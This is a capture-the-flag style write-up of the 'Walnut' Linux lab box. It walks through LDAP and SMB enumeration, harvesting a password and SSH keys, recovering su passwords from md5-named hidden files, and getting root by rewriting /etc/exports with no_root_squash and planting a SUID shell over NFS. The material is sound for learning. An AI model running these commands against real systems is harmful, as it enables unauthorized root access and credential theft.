---
title: 'HackSmarter: Walnut'
date: 2026-09-09
excerpt: Walnut is an easy linux machine from HackSmarter. You have been assigned a penetration test on a critical Linux server in the client's environment. The primary objective is to gain root-level access to this system to demonstrate maximum impact from the engagement.
readingTime: 1
tags:
  - Writeup
  - hacksmarter
  - Linux
  - Web
  - Easy
author: pir4cy
coverImage: /images/writeups/covers/hacksmarter/hsm-walnut-cover.png
draft: false
---

# Walnut

## Objective

You have been assigned a penetration test on a critical Linux server in the client's environment. The primary objective is to gain root-level access to this system to demonstrate maximum impact from the engagement.

## Initial Access

The client has provided you with credentials for an "Assumed Breach" scenario.

```bash
username: larryburns
password: IloveMontgommery!
Host: walnut.local
```

## Enumerate Away

### NMAP

A regular nmap scan to enumerate open ports on the machine:

![Nmap Scan](/images/writeups/machines/hacksmarter/HSM_Walnut/nmap.png "Nmap Scan")

Let's add `walnut.local` to our hosts file.

### SMB 

Trying the provided credentials does not provide us any access. There's a note in the lab:
> The credentials are not wrong. The box is working as intended... Try Harder ;)

So likely that the credentials are not for this service.

Guest logon to SMB is enabled. However we cannot access any shares.
```bash
nxc smb walnut.local -u 'pir4cy' -p '' --shares
```
![Share Enum](/images/writeups/machines/hacksmarter/HSM_Walnut/nxc-smb-guest-share.png)

We can enumerate users though, using netexec:
```bash
nxc smb walnut.local -u 'pir4cy' -p '' --users`
```
![User Enum](/images/writeups/machines/hacksmarter/HSM_Walnut/smb-guest-users.png)

User found: `automation`

### NFS

Since NFS is also open, let's take a look at what's mounted using `showmount`

```bash
showmount -e walnut.local
```
![NFS Check](/images/writeups/machines/hacksmarter/HSM_Walnut/nfs-empty.png "NFS Empty")

### LDAP

We also see LDAP in our initial nmap scan, so we can attempt to enumerate that as well.

Since we already have credentials, let's give that a shot:
```bash
ldapsearch -H ldap://walnut.local -x -D 'cn=larryburns,dc=walnut,dc=local' -w 'IloveMontgommery!' -b "dc=walnut,dc=local"
```
![LDAP Enum Fail](/images/writeups/machines/hacksmarter/HSM_Walnut/ldap-enum-1.png "LDAP Enum Fail")

After a little bit of research, I found out that OpenLDAP uses a different bind DN than the standard Active Directory pattern. In AD, a user often binds with something like `cn=alice,dc=example,dc=com`, because the directory stores the common name as the naming attribute. In this OpenLDAP instance, the users are actually stored under the `people` organizational unit and identified by their `uid` attribute instead of `cn`.

That means the first command failed because it was trying to authenticate against a DN that didn't exist in this directory layout. The bind string must match the actual LDAP object identity stored in the directory, not just the username you expect to log in with.

Once we switch to the correct identity:
```bash
ldapsearch -H ldap://walnut.local -x -D 'uid=larryburns,ou=people,dc=walnut,dc=local' -w 'IloveMontgommery!' -b "dc=walnut,dc=local"
```
we are authenticating to the actual LDAP entry for that user, and the query can enumerate the directory as intended.

In other words, `cn` and `uid` are not interchangeable in LDAP. The first is a naming attribute, while the second is the actual login/identity attribute used in this directory schema. Matching the bind DN to the directory's schema is a crucial part of directory enumeration and is a common gotcha when moving between AD and OpenLDAP environments.

![LDAP Enum Success](/images/writeups/machines/hacksmarter/HSM_Walnut/ldap-enum-2.png "LDAP Enum Success")

From this, we discover 2 things
1. A new user - `briangeoff`
2. Password in the description for the user `automation`

![Sensitive Info Found](/images/writeups/machines/hacksmarter/HSM_Walnut/ldap-enum-final.png "Sensitive Info Found")

## Foothold

With the credentials that were discovered via LDAP, we can now try the credentials against other services.

I first tried them against ssh but unfortunately ssh login is passwordless, so we move on to SMB again.

```bash
nxc smb walnut.local -u automation -p <REDACTED> --shares
```
![SMB Enum as automation](/images/writeups/machines/hacksmarter/HSM_Walnut/nxc-smb-automation.png "SMB as automation")

We finally have READ,WRITE access on the automation share.

I prefer downloading all files we can access using the `spider_plus` mode in netexec. 
```bash
nxc smb walnut.local -u automation -p <REDACTED> -M spider_plus -o DOWNLOAD_FLAG=True
```

We got user.txt and a very interesting script that runs `su -`

![Automation Share](/images/writeups/machines/hacksmarter/HSM_Walnut/automation-share-files.png "Automation Share")

We also get the `.ssh` folder from the user's home directory.

Using the keys, we can now login via SSH and get a stable terminal on the machine.

![SSH Access](/images/writeups/machines/hacksmarter/HSM_Walnut/ssh-access.png "SSH Access")

## Privilege Escalation

Once on the host, let's check /etc/passwd:

![User Enum After SSH](/images/writeups/machines/hacksmarter/HSM_Walnut/user-enum-after-ssh.png "/etc/passwd")

We find 4 more user directories under `/home/`

Let's take a look at the script we found earlier.
```bash
#!/bin/bash

PARM1="$1"
PARM2=`echo -n "$1" | md5sum | cut -d' ' -f 1`
PARM3="$2"
DATE=`date +%d.%m.%Y-%Hh%m.%S`

su - "$PARM1" -c "$PARM3" < /home/automation/.hidden/"$PARM2" > /home/automation/scripts/logs/"$1"-"$DATE".log
```
As an example, let's take the user `localjob1` and run the script with `./runScript localjob1 id`.

This is what the final command will look like:
```bash
su - localjob1 -c id < /home/automation/.hidden/$(echo -n localjob1 | md5sum | cut -d ' ' -f 1) > /home/automation/scripts/logs/localjob1-$(date +%d.%m.%Y-%Hh%m.%S).log
```

`< /home/automation/.hidden/$(echo -n localjob1 | md5sum | cut -d ' ' -f 1)` this part of the script is inputting directly into `su -`, which could mean that these files have the password.

Let's also take a look at the files stored in `.hidden` directory.

![hidden dir](/images/writeups/machines/hacksmarter/HSM_Walnut/hidden-dir.png "Hidden Directory")

Let's take a look at which file corresponds to which user. I used the following one-liner to match user with the contents of the hidden file:

```bash
automation@walnut:~$ for u in localjob1 localjob2 localjob3 localjob4; do h=$(echo -n "$u" | md5sum | cut -d' ' -f1); [ -f "$h" ] && echo "[+] $u -> $h : $(cat "$h")" || echo "[-] $u -> $h"; done
```

With that, we have a list of md5 files corresponding to our newfound users.
![md5 enum](/images/writeups/machines/hacksmarter/HSM_Walnut/md5-user-enum.png "md5 user enum")

The file for localjob3 is empty but there's also a corresponding bak file with the same name.

From the logs, we only see localjob1 and localjob3 creating logs, so likely the next step would be either of the 2 users. 

Since localjob3's password was hidden inside the bak, we try to login with that.

```bash
su - localjob3
```

### Path to Root

As localjob3, let's see what we have access to.

Starting with `sudo -l`, we quickly find out that this user can restart the nfs service.

![localjob3 sudo](/images/writeups/machines/hacksmarter/HSM_Walnut/localjob3-sudo.png "localjob3 sudo")

This will only be useful if we have control over what the service is reading at startup.

Reading the `.viminfo` we see that the user seems to have made some changes to `/etc/export`

![localjob3 viminfo](/images/writeups/machines/hacksmarter/HSM_Walnut/lj3-viminfo.png "viminfo")

However, when we check `ls -al`, we don't have write access to the same. There is a caveat here, the last `+` at the end of the permissions indicate the existence of extended permissions via ACL.

We can verify the permissions using `getfacl`. 

![localjob3 ACL](/images/writeups/machines/hacksmarter/HSM_Walnut/lj3-write-access.png "localjob3 ACL access")

Path to root found! Since we can make changes to `/etc/exports` and restart the nfs service, we can essentially export whatever we want (like the entire filesystem).

```bash
echo '/ *(rw,sync,no_root_squash,no_subtree_check)' > /etc/exports
```

With that, we can mount the entire `/` drive to nfs and grant access to anyone connecting from outside. Here's a breakdown of everything:
- '/' exports the entire filesystem
- '*' - any host can mount
- rw - read, write access
- sync - ensures that write operations are committed to the disk.
- no_root_squash - this is the privesc. Normally nfs will prevent remote root users. By default, if a root user tries to upload a file, it gets mapped to `nobody`, with this flag in place, this mapping is disabled and anything the root user writes will be mapped to root.
- no_subtree_check - NFS can check whether a requested file really belongs under the directory it's being uploaded to.

The key flags that will help us are `rw,no_root_squash`. With this, we can now mount the drive, upload a shell and gain a root shell on the machine.

Let's restart the service:
```bash
sudo /usr/bin/systemctl restart nfs-kernel-server.service
```
![nfs after localjob3 privesc](/images/writeups/machines/hacksmarter/HSM_Walnut/nfs-after-lj3-privesc.png "Filesystem exported")


### Root Shell

Always good to get a stable shell. We can start by mounting the NFS export to our attacker machine.

```bash
mkdir nfs-walnut
sudo mount -t nfs -o vers=4 walnut.local:/ nfs-walnut
```

![NFS mounted to Kali](/images/writeups/machines/hacksmarter/HSM_Walnut/nfs-mounted-to-kali.png "Filesystem mounted to Kali")

We can now simply print root.txt and solve the challenge, but getting a shell would be better. 

![Root found & Uploading SUID shel](/images/writeups/machines/hacksmarter/HSM_Walnut/root-found-upload-suid-bash.png "Root found and uploaded SUID shell")

![Rooted](/images/writeups/machines/hacksmarter/HSM_Walnut/rooted.png "Rooted")

## Conclusion

Really great box. Again, even the "Easy" machines on HSM force you to make sure that your enumeration is on point. The box did not contain a single bug or a CVE, it was all in the tiny misconfigurations that are very common in real world setups as well. 